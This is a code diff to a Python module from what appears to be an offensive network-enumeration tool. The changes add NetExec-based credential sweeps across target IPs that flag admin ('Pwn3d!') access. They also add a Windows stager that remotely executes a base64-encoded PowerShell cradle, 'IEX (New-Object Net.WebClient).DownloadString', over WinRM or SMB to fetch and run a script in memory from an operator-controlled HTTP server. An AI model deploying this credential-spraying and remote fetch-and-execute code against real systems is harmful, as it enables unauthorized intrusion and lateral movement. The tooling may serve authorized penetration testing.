@@ -23,6 +23,7 @@ from __future__ import annotations
 
 import base64
 import os
+import re
 import shutil
 import subprocess
 
@@ -45,16 +46,32 @@ def _read(path: str) -> str:
         return fh.read()
 
 
-def transport_for(host: Host, ssh_creds, win_creds) -> str | None:
-    """Pick a remote-exec transport for this host from open ports + OS + which
-    credential sets we were given. Windows transports win on a Windows box (or any
-    host exposing them) when we have SMB/WinRM creds; SSH otherwise."""
+def transport_for(host: Host, ssh_creds, win_creds, authmap=None) -> str | None:
+    """Pick a remote-exec transport for this host.
+
+    With an `authmap` (from `validate()` - nxc confirmed which protocols the creds
+    actually work on), pick a transport whose creds are PROVEN to authenticate
+    (and, for SMB, that we can exec on = admin). Without it, fall back to open
+    ports + OS + which cred sets we hold.
+    """
+    ip = host.ip
     ports = {p.portid for p in host.open_ports}
     svc = {(p.service or "").lower() for p in host.open_ports}
     has_ssh = 22 in ports or "ssh" in svc
     has_winrm = bool(ports & {5985, 5986})
     has_smb = 445 in ports
     is_linux = (host.os_family or "").lower() == "linux"
+
+    if authmap is not None and ip in authmap:
+        a = authmap[ip]
+        if win_creds and a.get("winrm"):
+            return "winrm"
+        if win_creds and a.get("smb"):          # smb == exec-capable (admin) here
+            return "smb"
+        if ssh_creds and a.get("ssh"):
+            return "ssh"
+        return None                              # creds checked, none worked here
+
     if win_creds and not (is_linux and has_ssh and ssh_creds):
         if has_winrm:
             return "winrm"
@@ -67,6 +84,63 @@ def transport_for(host: Host, ssh_creds, win_creds) -> str | None:
     if win_creds and has_smb:
         return "smb"
     return None
+
+
+# --- nxc credential / service validation ----------------------------------------
+
+# nxc line, e.g.  SMB  10.0.10.10  445  DC01  [+] corp\admin:Pw! (Pwn3d!)
+_NXC_LINE = re.compile(
+    r"\b(SMB|WINRM|SSH)\b.*?(\d{1,3}(?:\.\d{1,3}){3}).*?(\[\+\]|\[-\])(.*)$",
+    re.IGNORECASE)
+
+
+def _parse_nxc_auth(out: str) -> list[tuple[str, bool, bool]]:
+    """[(ip, authenticated, admin/pwned)] from an `nxc <proto>` auth sweep."""
+    rows = []
+    for line in (out or "").splitlines():
+        m = _NXC_LINE.search(line)
+        if not m:
+            continue
+        ip = m.group(2)
+        ok = m.group(3) == "[+]"
+        pwned = "pwn3d" in (m.group(4) or "").lower()
+        rows.append((ip, ok, pwned))
+    return rows
+
+
+def _ssh_nxc_auth(base: list, creds: dict) -> list:
+    argv = base + ["-u", creds.get("username", "")]
+    if creds.get("key"):
+        argv += ["--key-file", creds["key"]]
+    elif creds.get("password"):
+        argv += ["-p", creds["password"]]
+    return argv
+
+
+def validate(targets: list, ssh_creds, win_creds, timeout: int = 240) -> dict:
+    """Use nxc to see which protocols the given creds authenticate to across the
+    target IPs, so deploy only runs where it truly can. Returns
+    {ip: {"smb": bool_admin, "winrm": bool, "ssh": bool}}. Empty if nxc absent."""
+    tool = smb_tool()
+    authmap: dict[str, dict] = {}
+    if not tool or not targets:
+        return authmap
+    tlist = [str(t) for t in targets]
+
+    def sweep(proto: str, argv: list):
+        _, out, _ = _run(argv, timeout)
+        for ip, ok, pwned in _parse_nxc_auth(out):
+            slot = authmap.setdefault(ip, {})
+            # SMB exec needs admin, so record admin-capability for smb; winrm/ssh
+            # just need a valid bind.
+            slot[proto] = pwned if proto == "smb" else ok
+
+    if win_creds:
+        sweep("smb", _nxc_auth([tool, "smb", *tlist], win_creds))
+        sweep("winrm", _nxc_auth([tool, "winrm", *tlist], win_creds))
+    if ssh_creds:
+        sweep("ssh", _ssh_nxc_auth([tool, "ssh", *tlist], ssh_creds))
+    return authmap
 
 
 def _run(argv: list, timeout: int, stdin: str | None = None):
@@ -175,24 +249,58 @@ def run_smb(ip: str, creds: dict, script_path: str, timeout: int):
     return out, None
 
 
+def run_win_stager(ip: str, creds: dict, sub: str, stager, timeout: int):
+    """Trigger a Windows host to fetch recce-enum.ps1 from our HTTP stager and run
+    it in memory (no temp file, no size limit). `sub` is 'winrm' or 'smb'. Returns
+    (output|None, error|None, status) where status is 'ok' | 'unreachable' |
+    'authfail' | 'tool'."""
+    tool = smb_tool()
+    if not tool:
+        return None, "netexec/nxc not installed", "tool"
+    cradle = f"IEX (New-Object Net.WebClient).DownloadString('{stager.url('recce-enum.ps1')}')"
+    flag = "-X" if sub == "winrm" else "-x"
+    argv = _nxc_auth([tool, sub, ip], creds) + [
+        flag, f"powershell -NoProfile -EncodedCommand {_b64_ps(cradle)}"]
+    rc, out, err = _run(argv, timeout)
+    if rc is None:
+        return None, err, "unreachable"
+    if "recce-enum" in (out or "").lower():
+        return out, None, "ok"                     # ran; target reached the stager
+    if _looks_like_auth_fail(out, err):
+        return None, "authentication failed / not permitted", "authfail"
+    return None, "target could not reach the stager", "unreachable"
+
+
 # --- one host -------------------------------------------------------------------
 
-def deploy_one(host: Host, ssh_creds, win_creds, timeout: int = DEFAULT_TIMEOUT):
+def deploy_one(host: Host, ssh_creds, win_creds, timeout: int = DEFAULT_TIMEOUT,
+               stager=None, authmap=None):
     """Run the right on-target enum script on one host via the best transport.
-    Returns (transport|None, output|None, error|None)."""
-    t = transport_for(host, ssh_creds, win_creds)
+    With `stager`, Windows hosts fetch+run in memory over HTTP and fall back to
+    the push path if they can't reach it. Returns (transport|None, out|None,
+    error|None)."""
+    t = transport_for(host, ssh_creds, win_creds, authmap)
     if t is None:
         return None, None, ("no usable transport (need an open SSH/WinRM/SMB port "
-                            "and matching credentials)")
+                            "and working credentials)")
     if t == "ssh":
         out, err = run_ssh(host.ip, ssh_creds, _read(LINUX_SCRIPT), timeout)
-    elif t == "winrm":
+        return t, out, err
+    # Windows: try the in-memory HTTP stager first (if enabled), else push.
+    if stager is not None:
+        out, err, status = run_win_stager(host.ip, win_creds, t, stager, timeout)
+        if status == "ok":
+            return t + "+http", out, None
+        if status in ("authfail", "tool"):
+            return t, None, err                     # push won't fix these
+        # 'unreachable' -> fall through to the push path
+    if t == "winrm":
         out, err = run_winrm(host.ip, win_creds, _read(WINDOWS_SCRIPT), timeout)
-    else:  # smb
+    else:
         out, err = run_smb(host.ip, win_creds, WINDOWS_SCRIPT, timeout)
     return t, out, err
 
 
-def plan(hosts: list, ssh_creds, win_creds) -> list:
+def plan(hosts: list, ssh_creds, win_creds, authmap=None) -> list:
     """Preview: [(host, transport|None)] for every host, for --dry-run."""
-    return [(h, transport_for(h, ssh_creds, win_creds)) for h in hosts]
+    return [(h, transport_for(h, ssh_creds, win_creds, authmap)) for h in hosts]
